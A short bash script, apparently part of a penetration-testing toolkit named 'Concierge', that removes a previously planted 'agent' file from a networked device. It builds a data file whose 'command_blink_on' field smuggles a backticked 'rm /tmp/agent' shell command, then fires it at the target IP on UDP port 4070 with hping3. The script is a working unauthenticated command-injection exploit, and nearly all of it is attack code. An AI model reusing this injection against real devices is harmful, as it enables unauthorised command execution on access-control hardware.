#!/bin/bash
###########################################################################
# Writen by Mike Kelly                                                    #
# twitter.com/lixmk                                                       #
# github.com/lixmk                                                        #
# exfil.co                                                                #
###########################################################################
#                                                                         # 
#                   Concierge - 'agent' Script Remover                    #
#                                                                         #
###########################################################################
#                                                                         #
# This program is free software: you can redistribute it and/or modify    #
# it under the terms of the GNU General Public License as published by    #
# the Free Software Foundation, either version 3 of the License, or       #
# at your option) any later version.                                      #
#                                                                         #
# This program is distributed in the hope that it will be useful,         #
# but WITHOUT ANY WARRANTY; without even the implied warranty of          #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           #
# GNU General Public License for more details.                            #
#                                                                         #
# You should have received a copy of the GNU General Public License       #
# along with this program.  If not, see <http://www.gnu.org/licenses/>.   #
#                                                                         #
###########################################################################

CMDEXEC=`which hping3`
EXPECTED_ARGS=2;
if [ $# -ne $EXPECTED_ARGS ]
then
	echo "Usage: ./agentclean.sh <ip> <mac>"
  echo "Example: ./agentclean.sh 10.0.0.1 00:11:22:33:44:55"
	exit 1
fi

echo "[*] Creating Data File."
if [ "$(ls | egrep -q datafiles && echo "1" || echo "0")" = "0" ]
then
  mkdir datafiles
  cd ./datafiles
else
  cd ./datafiles
fi
echo 'command_blink_on;044;'$2';1`rm /tmp/agent`;' > data1.txt
echo "[*] Data File Created."

echo "[*] Executing"
echo "[*] Sending Payload 1"
${CMDEXEC} -2 -p 4070 -c 1 -E data1.txt -d 150 $1 2> /dev/null
echo ""
cd ../
echo "[*] 'agent' script removed from $1"
exit 1
